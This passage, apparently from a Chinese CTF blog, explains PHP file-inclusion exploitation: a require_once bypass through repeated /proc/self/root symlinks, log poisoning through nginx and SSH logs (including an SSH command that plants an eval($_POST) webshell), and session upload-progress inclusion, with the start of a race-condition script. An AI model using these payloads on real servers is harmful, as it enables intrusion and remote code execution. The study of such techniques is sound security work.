</span></span><span class="line"><span class="cl">    <span class="k">require_once</span><span class="p">(</span><span class="nv">$content</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>看看此题。我们知道php的文件包含机制是将已经包含的文件与文件的真实路径放进哈希表中，当已经<code>require_once('flag.php')</code>，已经include的文件不可以再require_once。怎么设想如何绕过这个哈希表，让php认为我们传入的文件名不在哈希表中，又可以让php能找到这个文件，读取到内容。</p>
<p>在这里有个小知识点，<code>/proc/self</code>指向当前进程的<code>/proc/pid/</code>，<code>/proc/self/root/</code>是指向<code>/</code>的符号链接，想到这里，用伪协议配合多级符号链接的办法进行绕过，payload:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">php</span><span class="o">://</span><span class="nx">filter</span><span class="o">/</span><span class="nx">convert</span><span class="o">.</span><span class="nx">base64</span><span class="o">-</span><span class="nx">encode</span><span class="o">/</span><span class="nx">resource</span><span class="o">=/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nx">www</span><span class="o">/</span><span class="nx">html</span><span class="o">/</span><span class="mf">1.</span><span class="nx">php</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">关键点1：PHP</span> <span class="nx">的路径解析有深度限制，PHP</span> <span class="nx">在解析符号链接时，最多只能解析</span> <span class="mi">40</span> <span class="nx">层，超过40层后，PHP</span> <span class="nx">就</span><span class="s2">&#34;放弃治疗&#34;</span><span class="nx">，不再完全解析</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">关键点2：PHP的包含文件哈希表检查解析的结果不同</span>
</span></span><span class="line"><span class="cl"><span class="nx">正常路径：</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nx">www</span><span class="o">/</span><span class="nx">html</span><span class="o">/</span><span class="nx">flag</span><span class="o">.</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">攻击路径：</span><span class="o">/</span><span class="nx">proc</span><span class="o">/..../</span><span class="nx">root</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nx">www</span><span class="o">/</span><span class="nx">html</span><span class="o">/</span><span class="nx">flag</span><span class="o">.</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">这两个路径在</span> <span class="nx">PHP检测看来是不同的文件</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">你告诉</span> <span class="nx">PHP：</span><span class="s2">&#34;我去过北京天安门&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nx">然后你换种说法：</span><span class="s2">&#34;我通过转机→高铁→出租车→步行...的方式到达了北京天安门&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nx">PHP</span> <span class="nx">觉得这是两个不同的目的地，就让你</span><span class="s2">&#34;又去了一次&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>详细可以看下文：</p>
<p><a class="link" href="https://www.anquanke.com/post/id/213235"  target="_blank" rel="noopener"
    >php源码分析 require_once 绕过不能重复包含文件的限制-安全KER - 安全资讯平台</a></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">2024极客大挑战：ez_include
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="三日志包含">三.日志包含
</h2><h3 id="31中间件日志文件包含">3.1中间件日志文件包含
</h3><p><strong>常见的日志目录</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">apache一般是</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nb">log</span><span class="o">/</span><span class="n">apache</span><span class="o">/</span><span class="n">access</span><span class="o">.</span><span class="n">log</span>
</span></span><span class="line"><span class="cl"><span class="n">apache2一般是</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nb">log</span><span class="o">/</span><span class="n">apache2</span><span class="o">/</span><span class="n">access</span><span class="o">.</span><span class="n">log</span>
</span></span><span class="line"><span class="cl"><span class="n">nginx的log在</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nb">log</span><span class="o">/</span><span class="n">nginx</span><span class="o">/</span><span class="n">access</span><span class="o">.</span><span class="n">log和</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nb">log</span><span class="o">/</span><span class="n">nginx</span><span class="o">/</span><span class="n">error</span><span class="o">.</span><span class="n">log</span>
</span></span><span class="line"><span class="cl"><span class="n">apache</span><span class="o">+</span><span class="n">Linux日志默认路径</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">httpd</span><span class="o">/</span><span class="n">logs</span><span class="o">/</span><span class="n">access_log</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nb">log</span><span class="o">/</span><span class="n">httpd</span><span class="o">/</span><span class="n">access_log</span>
</span></span><span class="line"><span class="cl"><span class="n">nginx</span> <span class="err">日志文件</span> <span class="err">用户安装目录</span><span class="n">logs目录下</span><span class="err">（</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">nginx</span><span class="o">/</span><span class="n">logs</span><span class="err">）</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nb">log</span><span class="o">/</span><span class="n">nginx</span><span class="o">/</span><span class="n">access</span><span class="o">.</span><span class="n">log</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nb">log</span><span class="o">/</span><span class="n">nginx</span><span class="o">/</span><span class="n">error</span><span class="o">.</span><span class="n">log</span>
</span></span><span class="line"><span class="cl"><span class="n">apache</span><span class="o">+</span><span class="n">linux</span> <span class="err">默认配置文件</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">httpd</span><span class="o">/</span><span class="n">conf</span><span class="o">/</span><span class="n">httpd</span><span class="o">.</span><span class="n">conf</span> <span class="n">index</span><span class="o">.</span><span class="n">php</span><span class="err">?</span><span class="n">page</span><span class="o">=/</span><span class="n">etc</span><span class="o">/</span><span class="n">init</span><span class="o">.</span><span class="n">d</span><span class="o">/</span><span class="n">httpd</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>还是上面的题，发现他是nginx服务器后直接包含<code>/var/log/nginx/access.log</code>,然后就可以在UA头执行命令了</p>
<p><img src="/p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251120125347242.png"
	width="1251"
	height="726"
	srcset="/p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251120125347242_hu_eb06c831bda29aea.png 480w, /p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251120125347242_hu_87a27cdacc1374e2.png 1024w"
	loading="lazy"
	
		alt="image-20251120125347242"
	
	
		class="gallery-image" 
		data-flex-grow="172"
		data-flex-basis="413px"
	
></p>
<h3 id="32ssh日志文件包含">3.2.SSH日志文件包含
</h3><p>SSH日志文件包含的利用条件是：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">SSH日志路径已知</span><span class="err">，并且具有可读权限</span><span class="p">,</span><span class="n">SSH日志文件的默认路径为</span><span class="err">`</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nb">log</span><span class="o">/</span><span class="n">auth</span><span class="o">.</span><span class="n">log</span><span class="err">`</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>下面介绍漏洞利用步骤</p>
<p><strong>将恶意代码写入文件</strong></p>
<p>SSH如果开启了日志记录的功能，那么会将ssh的连接日志记录到ssh日志文件当中，将连接的用户名设置成恶意代码，用命令连接服务器192.168.1.1的ssh服务</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ssh &#34;&lt;?php @eval($_POST[123]);?&gt;&#34;@192.168.1.1
</span></span></code></pre></td></tr></table>
</div>
</div><p>查看日志文件/var/log/auth.log，可以观察到恶意代码已经写入到日志文件</p>
<h2 id="四session包含">四.session包含
</h2><h3 id="41session的工作原理">4.1Session的工作原理
</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">在PHP中，Session是用来保存用户数据的一种方式。当使用session_start()函数初始化Session时，PHP会在服务器上的特定路径下创建一个Session文件。这个路径可以在php.ini文件中通过session.save_path指定。Session文件通常以sess_为前缀，后面跟着一个Session ID。当用户再次访问网站时，服务器会通过这个Session ID来找到对应的Session文件，并加载其中的数据。
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="42利用条件">4.2利用条件
</h3><p>session文件包含的利用条件有三个：</p>
<p><strong>Session的存储位置可以获取，Session的内容可控</strong>,<strong>session.upload_progress.enable=on</strong></p>
<p>一般通过以下两种方式获取session的存储位置：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">通过</span><span class="n">phpinfo的信息获取session的存储位置</span><span class="err">。</span>
</span></span><span class="line"><span class="cl"><span class="err">通过</span><span class="n">phpinfo的信息获取</span><span class="err">`</span><span class="n">session</span><span class="o">.</span><span class="n">save_path</span><span class="err">`</span>
</span></span><span class="line"><span class="cl"><span class="err">通过猜测默认的</span><span class="n">session存储位置进行尝试</span>
</span></span><span class="line"><span class="cl"><span class="err">通常</span><span class="n">Linux中的Session的默认存储位置在</span><span class="err">`</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">php</span><span class="o">/</span><span class="n">session</span><span class="err">`目录下</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>session常见存储路径:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">php</span><span class="o">/</span><span class="n">sess_PHPSESSID</span>
</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">sess_PHPSESSID</span>
</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">sessions</span><span class="o">/</span><span class="n">sess_PHPSESSID</span>
</span></span><span class="line"><span class="cl"><span class="n">session文件格式</span><span class="p">:</span><span class="n">sess_</span><span class="p">[</span><span class="n">phpsessid</span><span class="p">],</span><span class="err">而</span><span class="n">phpsessid在发送的请求的cookie字段中可以看到</span><span class="err">。</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>我们先看一下在php.ini中的几个关于session的配置</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">session</span><span class="o">.</span><span class="nx">upload_progress</span><span class="o">.</span><span class="nx">enabled</span> <span class="o">=</span> <span class="nx">on</span>
</span></span><span class="line"><span class="cl"><span class="nx">说明：启用上传进度功能。当设置为</span> <span class="nx">on</span> <span class="nx">时，PHP</span> <span class="nx">将允许在文件上传过程中追踪进度。需要与其他相关配置一起使用。</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="nx">session</span><span class="o">.</span><span class="nx">upload_progress</span><span class="o">.</span><span class="nx">cleanup</span> <span class="o">=</span> <span class="nx">on</span>
</span></span><span class="line"><span class="cl"><span class="nx">说明：启用上传进度的清理功能。当设置为</span> <span class="nx">on</span> <span class="nx">时，PHP</span> <span class="nx">会在上传完成后自动清理与上传进度相关的临时</span> <span class="nx">Session</span> <span class="nx">数据。这样可以防止过多的进度信息占用内存。（默认开启）</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="nx">session</span><span class="o">.</span><span class="nx">upload_progress</span><span class="o">.</span><span class="nx">prefix</span> <span class="o">=</span> <span class="s2">&#34;upload_progress_&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nx">说明：设置上传进度</span> <span class="nx">Session</span> <span class="nx">变量的前缀。PHP</span> <span class="nx">会创建一个以该前缀开头的</span> <span class="nx">Session</span> <span class="nx">变量来存储上传进度信息。默认情况下，上传进度变量的名称会是</span> <span class="nx">upload_progress_</span><span class="p">[</span><span class="nx">session_id</span><span class="p">]</span> <span class="nx">的形式。</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="nx">session</span><span class="o">.</span><span class="nx">upload_progress</span><span class="o">.</span><span class="nx">name</span> <span class="o">=</span> <span class="s2">&#34;PHP_SESSION_UPLOAD_PROGRESS&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nx">说明：设置用于访问上传进度信息的</span> <span class="nx">Session</span> <span class="nx">变量的名称。默认情况下，这个名称是</span> <span class="nx">PHP_SESSION_UPLOAD_PROGRESS，可以在</span> <span class="nx">JavaScript</span> <span class="nx">或其他客户端代码中使用该名称来获取上传进度。</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="nx">session</span><span class="o">.</span><span class="nx">upload_progress</span><span class="o">.</span><span class="nx">freq</span> <span class="o">=</span> <span class="s2">&#34;1%&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nx">说明：设置上传进度更新的频率。该选项指定了上传进度的信息更新频率，值为</span> <span class="mi">1</span><span class="o">%</span> <span class="nx">表示每当上传进度达到</span> <span class="mi">1</span><span class="o">%</span> <span class="nx">时，PHP</span> <span class="nx">会更新进度信息。可以设置为更高的比例，以减少</span> <span class="nx">Session</span> <span class="nx">的更新次数。</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="nx">session</span><span class="o">.</span><span class="nx">upload_progress</span><span class="o">.</span><span class="nx">min_freq</span> <span class="o">=</span> <span class="s2">&#34;1&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nx">说明：设置更新进度信息的最小频率（以秒为单位）。设置为</span> <span class="mi">1</span> <span class="nx">表示每秒至少更新一次上传进度信息。此选项可以帮助控制频繁更新所带来的性能开销。</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251120134510188.png"
	width="1791"
	height="909"
	srcset="/p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251120134510188_hu_5cd049bb781fa468.png 480w, /p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251120134510188_hu_a28c5013616fcad3.png 1024w"
	loading="lazy"
	
		alt="image-20251120134510188"
	
	
		class="gallery-image" 
		data-flex-grow="197"
		data-flex-basis="472px"
	
></p>
<h3 id="43如何创建session文件呢">4.3如何创建session文件呢。
</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">如果</span><span class="err">`</span><span class="n">session</span><span class="o">.</span><span class="n">auto_start</span><span class="o">=</span><span class="n">On</span><span class="err">`</span> <span class="err">，</span><span class="n">则PHP在接收请求的时候会自动初始化Session</span><span class="err">，</span><span class="n">不再需要执行session_start</span><span class="p">()</span><span class="err">。</span><span class="n">但默认情况下</span><span class="err">，</span><span class="n">这个选项都是关闭的</span><span class="err">。</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">但session还有一个默认选项</span><span class="err">，`</span><span class="n">session</span><span class="o">.</span><span class="n">use_strict_mode</span><span class="o">=</span><span class="n">Off</span><span class="err">`，</span><span class="n">这个配置决定了我们是否可以随意更改session</span><span class="err">，</span><span class="n">如果这个配置是打开的</span><span class="err">，</span><span class="n">比如</span><span class="err">，</span><span class="n">服务器端给的</span><span class="err">`</span><span class="n">PHPSESSID</span><span class="o">=</span><span class="n">wang</span><span class="err">`</span><span class="p">,</span><span class="n">此时我们</span><span class="o">**</span><span class="n">在Cookie里更改PHPSESSID</span><span class="o">=</span><span class="n">zhang</span><span class="o">**</span><span class="err">，</span><span class="n">服务端那边是不会认的</span><span class="p">,</span><span class="n">生成的文件是sess_wang</span><span class="err">。</span><span class="n">但例如这个配置关闭的话</span><span class="err">，</span><span class="n">我们就可以抓包更改PHPSESSID</span><span class="o">=</span><span class="n">zhang</span><span class="err">，</span><span class="n">此时在临时目录下就会生成sess_zhang临时文件</span><span class="err">。</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">同时上面也讲过了</span><span class="o">**</span><span class="n">SESSION_UPLOAD_PROGRESS</span><span class="o">**</span><span class="err">，</span><span class="n">既然session会被存储到临时文件中且又会往session文件中写入内容</span><span class="err">，</span><span class="n">那么如果我们能控制写入的内容</span><span class="err">，</span><span class="n">就能往目标主机上写马了</span><span class="err">，</span><span class="n">再配合文件包含漏洞就可以达到我们想要的效果</span><span class="err">。</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">事实上</span><span class="o">**</span><span class="n">SESSION_UPLOAD_PROGRESS</span><span class="o">**</span><span class="n">会把post的内容写入到session文件</span><span class="p">,</span><span class="n">通过控制post的内容即可写马</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">那么问题就来了</span><span class="p">,</span><span class="n">为什么不直接往session文件里面写马</span><span class="err">?</span><span class="n">因为虽然我们能控制session文件的名字</span><span class="p">,</span><span class="n">但是我们并不能控制它的内容</span><span class="p">(</span><span class="n">Session</span> <span class="n">文件内容是由</span> <span class="n">PHP</span> <span class="n">自动序列化生成的</span><span class="p">),</span><span class="n">只能使用</span><span class="o">**</span><span class="n">SESSION_UPLOAD_PROGRESS</span><span class="o">**</span><span class="n">去实现</span><span class="o">.</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="44攻击步骤">4.4.攻击步骤
</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">将恶意代码写入PHP_SESSION_UPLOAD_PROGRESS下
</span></span><span class="line"><span class="cl">攻击者可以通过PHPinfo或者猜测到session存放的位置
</span></span><span class="line"><span class="cl">PHPSEESID可以获得文件名称		(这个文件名可以控制，上面说了php默认session.use_strict_mode=Off)
</span></span><span class="line"><span class="cl">通过本地文件包含漏洞可以解析session文件达到攻击的目的
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>cleanup=on</code>表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要</p>
<p>如果<strong>session.upload_progress.cleanup</strong>被打开了,这就意味着<strong>SESSION_UPLOAD_PROGRESS</strong>往session中被写入的内容会被即时清除,这时候我们就需要利用利用PHP_SESSION_UPLOAD_PROGRESS加<code>条件竞争</code>进行文件包含</p>
<p>例题：ctfshow-82</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$file</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;php&#34;</span><span class="p">,</span> <span class="s2">&#34;???&#34;</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$file</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;data&#34;</span><span class="p">,</span> <span class="s2">&#34;???&#34;</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$file</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">,</span> <span class="s2">&#34;???&#34;</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$file</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;.&#34;</span><span class="p">,</span> <span class="s2">&#34;???&#34;</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">include</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>按照上面的步骤得</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="cl"><span class="c1"># @author:lonmar
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">import</span> <span class="nx">io</span>
</span></span><span class="line"><span class="cl"><span class="nx">import</span> <span class="nx">requests</span>
</span></span><span class="line"><span class="cl"><span class="nx">import</span> <span class="nx">threading</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="nx">sessID</span> <span class="o">=</span> <span class="s1">&#39;flag&#39;</span>			<span class="c1">#session文件名控制
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">url</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>     <span class="c1">#这里改为题目的url地址
</span></span></span><span class="line"><span class="cl"><span class="c1"></span> 
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="nx">def</span> <span class="nx">write</span><span class="p">(</span><span class="nx">session</span><span class="p">)</span><span class="o">:</span>
